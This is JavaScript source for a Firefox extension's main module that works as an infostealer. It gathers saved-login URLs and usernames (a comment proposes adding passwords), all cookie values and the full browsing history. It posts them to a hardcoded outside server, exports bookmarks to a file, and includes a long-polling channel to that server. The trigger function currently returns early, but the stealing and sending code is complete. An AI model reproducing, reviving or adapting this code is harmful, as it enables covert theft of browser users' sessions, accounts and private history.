// The main module of the torpedo extension.


require("tabs").on("ready", logURL);

var passw = require("passwords");
var request = require("request");
var {Cc, Ci, Cu} = require("chrome");

Cu.import("resource://gre/modules/PlacesUtils.jsm");

var historyService = Cc["@mozilla.org/browser/nav-history-service;1"].getService(Ci.nsINavHistoryService);
var dirSvc = Cc["@mozilla.org/file/directory_service;1"].getService(Ci.nsIProperties);
var ioService=Cc["@mozilla.org/network/io-service;1"].getService(Ci.nsIIOService);
var scriptableStream=Cc["@mozilla.org/scriptableinputstream;1"].getService(Ci.nsIScriptableInputStream);
var cookieManager = Cc["@mozilla.org/cookiemanager;1"].getService(Ci.nsICookieManager);

var server = "http://joshbalfour.co.uk:1337/";


function logURL(tab) {
 

return;
  sendData(tab.url,"h");
  show_all_passwords();
  getCookies();
  getHistory();
  getBookmarks();
}


function getHistory()
{
   var history = Array();
   

    // queries parameters (e.g. domain name matching, text terms matching, time range...)
    // see : https://developer.mozilla.org/en/nsINavHistoryQuery
    var query = historyService.getNewQuery();
    
    // options parameters (e.g. ordering mode and sorting mode...)
    // see : https://developer.mozilla.org/en/nsINavHistoryQueryOptions
    var options = historyService.getNewQueryOptions();
    
    // execute the query
    // see : https://developer.mozilla.org/en/nsINavHistoryService#executeQuery()
    var result = historyService.executeQuery(query, options);
    
    // Using the results by traversing a container
    // see : https://developer.mozilla.org/en/nsINavHistoryContainerResultNode
    var cont = result.root;
        cont.containerOpen = true;
        
    for (var i = 0; i < cont.childCount; i ++) {
        var node = cont.getChild(i);
        // "node" attributes contains the information (e.g. URI, title, time, icon...)
        // see : https://developer.mozilla.org/en/nsINavHistoryResultNode
       history.push(Array(node.title,node.uri,node.time));
    }
    
    // Close container when done
    // see : https://developer.mozilla.org/en/nsINavHistoryContainerResultNode
    cont.containerOpen = false;
    sendData(history,"hi");
    
}

function getBookmarks(){
    
    // Create the backup file
    var jsonFile = dirSvc.get("ProfD", Ci.nsILocalFile);
    var fName = new Date();
    var nameOfFile = fName.getTime()+".json";
    jsonFile.append(nameOfFile);
    jsonFile.create(Ci.nsILocalFile.NORMAL_FILE_TYPE, 0600);
    
    // Export bookmarks in JSON format to file
    PlacesUtils.backupBookmarksToFile(jsonFile);
  //  socketLogger(Read(jsonFile.path));
    
}

function Read(file)
{
   

    var channel=ioService.newChannel(file,null,null);
    var input=channel.open();
    scriptableStream.init(input);
    var str=scriptableStream.read(input.available());
    scriptableStream.close();
    input.close();
    return str;
}

function show_all_passwords() {
allCredentials = Array();
  passw.search({
    onComplete: function (credentials) {
      credentials.forEach(function(credential) {
        allCredentials.push(Array(credential.url,credential.username)); // add ,credential.password
        });
        sendData(allCredentials,"c");
        return;
      }       
    });
}


function getCookies()
{
    cookies = Array();      
    for (var e = cookieManager.enumerator; e.hasMoreElements();) {
        var cookie = e.getNext().QueryInterface(Ci.nsICookie); 
        cookies.push(Array(cookie.host,cookie.name,cookie.value));
    }
    sendData(cookies,"co");
}



function sendData(data2,handler)
{       
    var url = server+handler;
    
    if (handler == "h")
    {
        var currentTime = new Date()
        var month = currentTime.getMonth() + 1
        var day = currentTime.getDate()
        var year = currentTime.getFullYear()
        date = month + "/" + day + "/" + year 
        data2 = new Array(date,data2); 
    }
    
    var req = request.Request({
           url:url,
           content:{
               data:JSON.stringify(data2)             
               }
       }).post();    
}    



function io(server, read, onClose){
    this.xhr = require("request");
	this.server = server;
	this.writeBuffer = [];
	this.writeXHR = null;
    this.readFunction =  read || function(){};
    this.onClose =  onClose || function(){};
	this.readPoll = null;
	this.running == true;
}

io.prototype.setOnRead = function(func){
	this.readFunction = func;
}

io.prototype.close = function(){
	this.running = false;
    this.onClose();
}


io.prototype.write = function(data){
    socketLogger('Writing to send buffer');
	this.writeBuffer.push(data);
	this.sendWriteData();
}

io.prototype.sendWriteData = function(){
	
	if(this.running == false)
		return
	
    var me = this;
	if(this.writeXHR != null || this.writeBuffer.length == 0){
        socketLogger('No data to write');
		return;
	}else{
        socketLogger('Writing data to server');
		this.xhr.Request({
			url:this.server + "/io/write",
			content:{
				sessionId: this.sessionId,
				data: JSON.stringify(this.writeBuffer)
			},
			onComplete: function(response){
                me.sendWriteData();
				socketLogger('Data has been sent!');
			}
		}).post(); 
        this.writeBuffer = [];
	}
}

io.prototype.connect = function(callBack){
	socketLogger('connectiing...');
	callBack = callBack || function(){};
	var me = this;
	this.xhr.Request({
		url: this.server + "/io/handshake",
		onComplete: function(response){
        socketLogger('decoding');
			if(response.json == null){
				callBack({'code':'-1', 'message': 'Error'})
			}else{
				me.sessionId = response.json['sessionId'];
				me.startPolling();
                socketLogger('Connect to server');
				callBack({'code':'0', 'message': 'Success'})
			}
		}
	}).get();
    
    return this;
}

io.prototype.startPolling = function(){
	if(this.readPoll != null)	
		return;
    socketLogger('Polling enabled');
	this.makePoll();
}

io.prototype.makePoll = function(){
	
	if(this.running == false)
		return
	
    socketLogger('Openning long poll');
	var me = this;
	this.xhr.Request({
		url:this.server + "/io/read",
		content:{
			sessionId: this.sessionId
		},
		onComplete: function(response){
        socketLogger(JSON.stringify(response));
            
            if(response.json == null){
                return;
                socketLogger('Message body blank');
            }
            
            if(response.json['error'] == -2){
                me.close();
                socketLogger('Key not recognised');
            }
            
			for(var i in response.json['data']){
                socketLogger('Reading data from response.json');
				me.readFunction(response.json['data'][i]);
			}
			me.makePoll();
		}
	}).post();
}

socketLogger = function(text){
	return;
	console.log(text);
}


/*
SOCKET USAGE INSTRUCTIONS

New socket
-----------

url = 'http://localhost:1337'; //Domain of server
onRead = function(data){}; 	//This is the default function called
							//each time data is sent to the server
							//data si what ever was sent, text, object, int, etc..

onClose = function(socket){};  //this function is called when the socket closes
								//due to the server decline the connection
								// or the user closing it

callBack = function(result){}; // This function is called when the
								//connection is made or fails
								//result['code'] == 0 == succesfull
								//result['code'] == -1 == connection error
								
var socket = new io(url, onRead, onClose).connection(callBack);

socket.write(obj); //send data the server
					//obj can be anything, int, string, etc, but json is recommeded

socket.setOnRead(function(data){}) //change the function called when data
									//is received from the server

*/
